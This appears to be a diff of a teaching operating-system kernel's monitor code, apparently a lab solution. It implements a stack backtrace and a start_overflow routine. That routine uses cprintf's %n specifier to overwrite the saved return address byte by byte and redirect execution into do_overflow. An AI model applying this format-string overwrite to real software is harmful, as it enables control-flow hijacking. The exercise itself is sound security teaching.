@@ -33,7 +33,7 @@ static struct Command commands[] = {
 unsigned read_eip();
 
 /***** Implementations of basic kernel monitor commands *****/
-inline uint64_t
+uint64_t
 rdtsc()
 {
 	uint32_t low, high;
@@ -105,7 +105,11 @@ void
 do_overflow(void)
 {
     cprintf("Overflow success\n");
+		// gcc's optimization differs
+		cprintf("Backtrace success\n");
 }
+
+#define get_ret_byte(addr, off) ((addr >> (off * 8)) & 0xff)
 
 void
 start_overflow(void)
@@ -114,62 +118,77 @@ start_overflow(void)
 	// to invoke the do_overflow function and
 	// the procedure must return normally.
 
-    // And you must use the "cprintf" function with %n specifier
-    // you augmented in the "Exercise 9" to do this job.
+	// And you must use the "cprintf" function with %n specifier
+	// you augmented in the "Exercise 9" to do this job.
 
-    // hint: You can use the read_pretaddr function to retrieve
-    //       the pointer to the function call return address;
+	// hint: You can use the read_pretaddr function to retrieve
+	//       the pointer to the function call return address;
 
-    char str[256] = {};
-    int nstr = 0;
-    char *pret_addr;
+	char str[256] = {};
+	int nstr = 0;
+	char *pret_addr;
 
-		// Your code here.
-		pret_addr = (char*)read_pretaddr();
+	// Your code here.
+	pret_addr = (char *) read_pretaddr();
+	memset(str, 0x11, 256);
+	uint32_t ret_addr = (uint32_t) do_overflow + 3;	// ignore push ebp, mov esp, ebp
 
-		void (*overflow)(void) = do_overflow;
-		uint32_t ret_addr = (uint32_t)overflow + 0x3; // pass push ebp + mov esp, ebp
-		uint32_t ret_byte_0 = ret_addr & 0xff;
-		uint32_t ret_byte_1 = (ret_addr >> 8) & 0xff;
-		uint32_t ret_byte_2 = (ret_addr >> 16) & 0xff;
-		uint32_t ret_byte_3 = (ret_addr >> 24) & 0xff;
+	// *(uint32_t *)pret_addr = ret_addr;
+	// cprintf("0x%x\n", pret_addr);
+
+	str[get_ret_byte(ret_addr, 0)] = 0;
+	cprintf("%s%n\n", str, pret_addr);
+
+	str[get_ret_byte(ret_addr, 0)] = 0x11;
+	str[get_ret_byte(ret_addr, 1)] = 0;
+	cprintf("%s%n\n", str, pret_addr + 1);
+
+	str[get_ret_byte(ret_addr, 1)] = 0x11;
+	str[get_ret_byte(ret_addr, 2)] = 0;
+	cprintf("%s%n\n", str, pret_addr + 2);
+
+	str[get_ret_byte(ret_addr, 2)] = 0x11;
+	str[get_ret_byte(ret_addr, 3)] = 0;
+	cprintf("%s%n\n", str, pret_addr + 3);
+	cprintf("0x%x\n", pret_addr);
 }
 
 void
 overflow_me(void)
 {
-        start_overflow();
+	start_overflow();
 }
 
 #define EBP_OFFSET(ebp, offset) (*((uint32_t *)(ebp) + (offset)))
+
 int
 mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 {
 	// Your code here.
-		uint32_t ebp = read_ebp(), eip;
+	uint32_t ebp = read_ebp(), eip;
 
-		cprintf("Stack backtrace:\n");
-		while(ebp != 0x0) {
-			eip = EBP_OFFSET(ebp, 1);
-			cprintf("  eip %08x  ebp %08x  args %08x %08x %08x %08x %08x\n",
-					eip, ebp, EBP_OFFSET(ebp, 2), EBP_OFFSET(ebp, 3), EBP_OFFSET(ebp, 4),
-					EBP_OFFSET(ebp, 5), EBP_OFFSET(ebp, 6));
-			// debug info
-			struct Eipdebuginfo info;
-			if (!debuginfo_eip(eip, &info)) {
-				char func_name[info.eip_fn_namelen + 1];
-				func_name[info.eip_fn_namelen] = '\0';
-				if (strncpy(func_name, info.eip_fn_name, info.eip_fn_namelen)) {
-					cprintf("\t%s:%d: %s+%x\n\n", info.eip_file, info.eip_line,
-							func_name, eip - info.eip_fn_addr);
-				}
+	cprintf("Stack backtrace:\n");
+	while(ebp != 0x0) {
+		eip = EBP_OFFSET(ebp, 1);
+		cprintf("  eip %08x  ebp %08x  args %08x %08x %08x %08x %08x\n",
+		eip, ebp, EBP_OFFSET(ebp, 2), EBP_OFFSET(ebp, 3), EBP_OFFSET(ebp, 4),
+		EBP_OFFSET(ebp, 5), EBP_OFFSET(ebp, 6));
+		// debug info
+		struct Eipdebuginfo info;
+		if (!debuginfo_eip(eip, &info)) {
+			char func_name[info.eip_fn_namelen + 1];
+			func_name[info.eip_fn_namelen] = '\0';
+			if (strncpy(func_name, info.eip_fn_name, info.eip_fn_namelen)) {
+				cprintf("\t%s:%d: %s+%x\n\n", info.eip_file, info.eip_line,
+				func_name, eip - info.eip_fn_addr);
 			}
-			// warning: the value of ebp to print is register value, not stack value
-			ebp = EBP_OFFSET(ebp, 0);
 		}
+		// warning: the value of ebp to print is register value, not stack value
+		ebp = EBP_OFFSET(ebp, 0);
+	}
 
-    overflow_me();
-    cprintf("Backtrace success\n");
+	overflow_me();
+	cprintf("Backtrace success\n");
 	return 0;
 }
 
